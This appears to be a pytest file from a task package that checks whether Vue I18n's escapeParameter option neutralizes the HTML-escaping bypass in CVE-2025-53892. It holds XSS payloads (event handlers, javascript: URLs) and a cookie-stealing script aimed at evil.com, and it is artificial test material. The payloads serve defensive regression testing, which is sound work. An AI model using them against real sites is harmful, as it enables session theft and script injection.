"""
Vulnerability tests for Vue I18n HTML escaping bypass (CVE-2025-53892).

These tests verify that the escapeParameter option properly neutralizes
dangerous HTML patterns. Tests should:
- FAIL in vulnerable state (dangerous patterns are executable)
- PASS in fixed state (dangerous patterns are neutralized)
"""
import subprocess
import json
import pytest
import os
import re


def run_node_test(test_code: str) -> dict:
    """Run a JavaScript test using Node.js and return the result."""
    test_file = "/tests/_temp_vuln_test.mjs"

    # Use the full @intlify/core package which includes the message compiler
    full_code = f'''
import {{ createCoreContext, translate }} from '/app/packages/core/dist/core.mjs';

// Polyfill __DEV__ if not defined
globalThis.__DEV__ = false;

{test_code}
'''

    with open(test_file, 'w') as f:
        f.write(full_code)

    try:
        result = subprocess.run(
            ['node', test_file],
            capture_output=True,
            text=True,
            timeout=30,
            cwd='/app'
        )

        output = result.stdout.strip()
        stderr = result.stderr.strip()

        return {
            'success': result.returncode == 0,
            'stdout': output,
            'stderr': stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {
            'success': False,
            'stdout': '',
            'stderr': 'Test timed out',
            'returncode': -1
        }
    except Exception as e:
        return {
            'success': False,
            'stdout': '',
            'stderr': str(e),
            'returncode': -1
        }
    finally:
        if os.path.exists(test_file):
            os.remove(test_file)


class TestEventHandlerNeutralization:
    """Test that event handler attributes are neutralized."""

    def test_onerror_event_handler_basic(self):
        """Test that onerror event handlers in message templates are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            imgMsg: 'Warning: <img src=x onerror="{payload}">'
        }
    }
});

const output = translate(ctx, 'imgMsg', {
    payload: 'alert("xss")'
});

console.log(JSON.stringify({ output }));

// The output should NOT contain an executable onerror attribute
// Pattern: onerror=" or onerror='
const hasExecutableOnerror = /\\sonerror\\s*=\\s*["']/i.test(output);

if (hasExecutableOnerror) {
    console.error('VULNERABLE: onerror attribute is still executable');
    process.exit(1);
}

// The 'on' should be escaped (&#111;n or similar)
if (!output.includes('&#111;n') && !output.includes('&amp;#111;n')) {
    console.error('VULNERABLE: onerror attribute was not neutralized');
    process.exit(1);
}

console.log('PASS: onerror was neutralized');
''')
        assert result['success'], f"Test failed - onerror not neutralized: {result['stderr']}\nOutput: {result['stdout']}"

    def test_onclick_event_handler(self):
        """Test that onclick event handlers are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            buttonMsg: 'Click <button onclick="{action}">here</button>'
        }
    }
});

const output = translate(ctx, 'buttonMsg', {
    action: 'alert("clicked")'
});

console.log(JSON.stringify({ output }));

// Should not have executable onclick
const hasExecutableOnclick = /\\sonclick\\s*=\\s*["']/i.test(output);

if (hasExecutableOnclick) {
    console.error('VULNERABLE: onclick attribute is still executable');
    process.exit(1);
}

console.log('PASS: onclick was neutralized');
''')
        assert result['success'], f"Test failed - onclick not neutralized: {result['stderr']}"

    def test_onload_event_handler(self):
        """Test that onload event handlers are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            svgMsg: 'Icon: <svg onload="{code}"><circle/></svg>'
        }
    }
});

const output = translate(ctx, 'svgMsg', {
    code: 'malicious()'
});

console.log(JSON.stringify({ output }));

// Should not have executable onload
const hasExecutableOnload = /\\sonload\\s*=\\s*["']/i.test(output);

if (hasExecutableOnload) {
    console.error('VULNERABLE: onload attribute is still executable');
    process.exit(1);
}

console.log('PASS: onload was neutralized');
''')
        assert result['success'], f"Test failed - onload not neutralized: {result['stderr']}"

    def test_onfocus_event_handler(self):
        """Test that onfocus event handlers are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            inputMsg: 'Search: <input onfocus="{handler}" autofocus>'
        }
    }
});

const output = translate(ctx, 'inputMsg', {
    handler: 'stealData()'
});

console.log(JSON.stringify({ output }));

// Should not have executable onfocus
const hasExecutableOnfocus = /\\sonfocus\\s*=\\s*["']/i.test(output);

if (hasExecutableOnfocus) {
    console.error('VULNERABLE: onfocus attribute is still executable');
    process.exit(1);
}

console.log('PASS: onfocus was neutralized');
''')
        assert result['success'], f"Test failed - onfocus not neutralized: {result['stderr']}"

    def test_onmouseover_event_handler(self):
        """Test that onmouseover event handlers are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            divMsg: 'Hover: <div onmouseover="{action}">content</div>'
        }
    }
});

const output = translate(ctx, 'divMsg', {
    action: 'track()'
});

console.log(JSON.stringify({ output }));

// Should not have executable onmouseover
const hasExecutableOnmouseover = /\\sonmouseover\\s*=\\s*["']/i.test(output);

if (hasExecutableOnmouseover) {
    console.error('VULNERABLE: onmouseover attribute is still executable');
    process.exit(1);
}

console.log('PASS: onmouseover was neutralized');
''')
        assert result['success'], f"Test failed - onmouseover not neutralized: {result['stderr']}"


class TestJavaScriptURLNeutralization:
    """Test that javascript: URLs are neutralized."""

    def test_javascript_href_basic(self):
        """Test that javascript: URLs in href are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            linkMsg: 'Click <a href="{url}">here</a>'
        }
    }
});

const output = translate(ctx, 'linkMsg', {
    url: 'javascript:alert(1)'
});

console.log(JSON.stringify({ output }));

// Should not have executable javascript: URL
// The colon should be escaped to &#58; or similar
const hasExecutableJsUrl = /href\\s*=\\s*["']\\s*javascript:/i.test(output);

if (hasExecutableJsUrl) {
    console.error('VULNERABLE: javascript: URL is still executable');
    process.exit(1);
}

console.log('PASS: javascript: URL was neutralized');
''')
        assert result['success'], f"Test failed - javascript URL not neutralized: {result['stderr']}"

    def test_javascript_src_attribute(self):
        """Test that javascript: URLs in src are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            iframeMsg: 'Content: <iframe src="{source}"></iframe>'
        }
    }
});

const output = translate(ctx, 'iframeMsg', {
    source: 'javascript:document.write("hacked")'
});

console.log(JSON.stringify({ output }));

// Should not have executable javascript: in src
const hasExecutableJsUrl = /src\\s*=\\s*["']\\s*javascript:/i.test(output);

if (hasExecutableJsUrl) {
    console.error('VULNERABLE: javascript: URL in src is still executable');
    process.exit(1);
}

console.log('PASS: javascript: URL in src was neutralized');
''')
        assert result['success'], f"Test failed - javascript URL in src not neutralized: {result['stderr']}"

    def test_javascript_action_attribute(self):
        """Test that javascript: URLs in action are neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            formMsg: 'Submit: <form action="{target}"><input type="submit"></form>'
        }
    }
});

const output = translate(ctx, 'formMsg', {
    target: 'javascript:stealFormData()'
});

console.log(JSON.stringify({ output }));

// Should not have executable javascript: in action
const hasExecutableJsUrl = /action\\s*=\\s*["']\\s*javascript:/i.test(output);

if (hasExecutableJsUrl) {
    console.error('VULNERABLE: javascript: URL in action is still executable');
    process.exit(1);
}

console.log('PASS: javascript: URL in action was neutralized');
''')
        assert result['success'], f"Test failed - javascript URL in action not neutralized: {result['stderr']}"

    def test_javascript_url_case_variations(self):
        """Test various case combinations for javascript: URLs."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            link1: 'Link: <a href="{url1}">1</a>',
            link2: 'Link: <a href="{url2}">2</a>',
            link3: 'Link: <a href="{url3}">3</a>'
        }
    }
});

const output1 = translate(ctx, 'link1', { url1: 'JAVASCRIPT:alert(1)' });
const output2 = translate(ctx, 'link2', { url2: 'JavaScript:alert(2)' });
const output3 = translate(ctx, 'link3', { url3: 'jAvAsCrIpT:alert(3)' });

console.log(JSON.stringify({ output1, output2, output3 }));

// All variations should be neutralized
const hasExecutable1 = /href\\s*=\\s*["']\\s*javascript:/i.test(output1);
const hasExecutable2 = /href\\s*=\\s*["']\\s*javascript:/i.test(output2);
const hasExecutable3 = /href\\s*=\\s*["']\\s*javascript:/i.test(output3);

if (hasExecutable1 || hasExecutable2 || hasExecutable3) {
    console.error('VULNERABLE: Some javascript: URL case variation not neutralized');
    process.exit(1);
}

console.log('PASS: All javascript: URL case variations neutralized');
''')
        assert result['success'], f"Test failed - javascript URL case variations not neutralized: {result['stderr']}"


# NOTE: TestAttributeInjection tests were removed because they test basic quote escaping
# which works in both vulnerable and fixed versions. The CVE specifically relates to
# event handler and javascript: URL neutralization, not quote escaping.


class TestComplexAttackVectors:
    """Test complex attack vectors and edge cases."""

    def test_multiple_event_handlers_in_one_message(self):
        """Test neutralization when multiple event handlers exist in one message."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            complexMsg: '<div onclick="{click}" onmouseover="{hover}" onload="{load}">content</div>'
        }
    }
});

const output = translate(ctx, 'complexMsg', {
    click: 'fn1()',
    hover: 'fn2()',
    load: 'fn3()'
});

console.log(JSON.stringify({ output }));

// None of the event handlers should be executable
const hasOnclick = /\\sonclick\\s*=\\s*["']/i.test(output);
const hasOnmouseover = /\\sonmouseover\\s*=\\s*["']/i.test(output);
const hasOnload = /\\sonload\\s*=\\s*["']/i.test(output);

if (hasOnclick || hasOnmouseover || hasOnload) {
    console.error('VULNERABLE: Some event handlers were not neutralized');
    process.exit(1);
}

console.log('PASS: All event handlers neutralized');
''')
        assert result['success'], f"Test failed - multiple handlers not neutralized: {result['stderr']}"

    def test_script_tag_in_payload(self):
        """Test that script tags in payloads are properly escaped AND onerror is neutralized."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            imgMsg: 'Image: <img src=x onerror="{payload}">'
        }
    }
});

const output = translate(ctx, 'imgMsg', {
    payload: '<script>document.location="http://evil.com?c="+document.cookie</script>'
});

console.log(JSON.stringify({ output }));

// onerror should be neutralized - this is the CVE vulnerability
const hasOnerror = /\\sonerror\\s*=\\s*["']/i.test(output);
if (hasOnerror) {
    console.error('VULNERABLE: onerror was not neutralized');
    process.exit(1);
}

// Should contain the escaped on prefix (&#111;n)
if (!output.includes('&#111;n')) {
    console.error('VULNERABLE: onerror was not neutralized with &#111;n encoding');
    process.exit(1);
}

console.log('PASS: onerror neutralized');
''')
        assert result['success'], f"Test failed - onerror not neutralized: {result['stderr']}"

    def test_data_uri_with_event_handler(self):
        """Test that event handlers are still vulnerable even with data URIs."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            // This tests the CVE - onerror in message template should be neutralized
            imgMsg: 'Image: <img src="{src}" onerror="{handler}">'
        }
    }
});

const output = translate(ctx, 'imgMsg', {
    src: 'invalid',
    handler: 'alert(1)'
});

console.log(JSON.stringify({ output }));

// onerror should be neutralized - this is the CVE vulnerability
const hasOnerror = /\\sonerror\\s*=\\s*["']/i.test(output);
if (hasOnerror) {
    console.error('VULNERABLE: onerror was not neutralized');
    process.exit(1);
}

console.log('PASS: onerror neutralized');
''')
        assert result['success'], f"Test failed - onerror not neutralized: {result['stderr']}"


class TestRegressionScenarios:
    """Test scenarios from original vulnerability report."""

    def test_ghsa_poc_img_onerror(self):
        """Test the original PoC from the security advisory (img onerror)."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            vulnerable: 'Caution: <img src=x onerror="{payload}">'
        }
    }
});

const result = translate(ctx, 'vulnerable', {
    payload: '<script>alert("xss")</script>'
});

console.log(JSON.stringify({ result }));

// After fix: onerror should be &#111;nerror, preventing execution
// The 'on' prefix should be escaped
const hasExecutableOnerror = /\\sonerror\\s*=\\s*["']/i.test(result);

if (hasExecutableOnerror) {
    console.error('VULNERABLE: Original PoC attack vector still works');
    process.exit(1);
}

// Should contain the escaped version
if (!result.includes('&#111;n')) {
    console.error('VULNERABLE: Event handler not neutralized with &#111;n encoding');
    process.exit(1);
}

console.log('PASS: Original PoC attack vector is mitigated');
''')
        assert result['success'], f"Test failed - GHSA PoC not mitigated: {result['stderr']}"

    def test_ghsa_poc_javascript_url(self):
        """Test the JavaScript URL injection from the security advisory."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            link: 'Click <a href="{url}">here</a>'
        }
    }
});

const result = translate(ctx, 'link', {
    url: 'javascript:alert(1)'
});

console.log(JSON.stringify({ result }));

// After fix: javascript: should become javascript&#58; or similar
const hasExecutableJs = /href\\s*=\\s*["']\\s*javascript:/i.test(result);

if (hasExecutableJs) {
    console.error('VULNERABLE: javascript: URL attack still works');
    process.exit(1);
}

// Should contain escaped colon
if (!result.includes('javascript&#58;') && !result.includes('javascript&amp;#58;')) {
    console.error('VULNERABLE: javascript: URL colon not escaped');
    process.exit(1);
}

console.log('PASS: javascript: URL attack mitigated');
''')
        assert result['success'], f"Test failed - javascript URL PoC not mitigated: {result['stderr']}"

    def test_ghsa_poc_onsubmit_handler(self):
        """Test onsubmit event handler neutralization (form-based attack vector)."""
        result = run_node_test('''
const ctx = createCoreContext({
    locale: 'en',
    escapeParameter: true,
    warnHtmlMessage: false,
    messages: {
        en: {
            form: 'Submit: <form onsubmit="{handler}"><input type="submit"></form>'
        }
    }
});

const result = translate(ctx, 'form', {
    handler: 'stealData()'
});

console.log(JSON.stringify({ result }));

// After fix: onsubmit should be neutralized (&#111;nsubmit)
const hasExecutableOnsubmit = /\\sonsubmit\\s*=\\s*["']/i.test(result);

if (hasExecutableOnsubmit) {
    console.error('VULNERABLE: onsubmit event handler not neutralized');
    process.exit(1);
}

// Should contain the escaped on prefix
if (!result.includes('&#111;n')) {
    console.error('VULNERABLE: onsubmit not neutralized with &#111;n encoding');
    process.exit(1);
}

console.log('PASS: onsubmit event handler neutralized');
''')
        assert result['success'], f"Test failed - onsubmit not neutralized: {result['stderr']}"
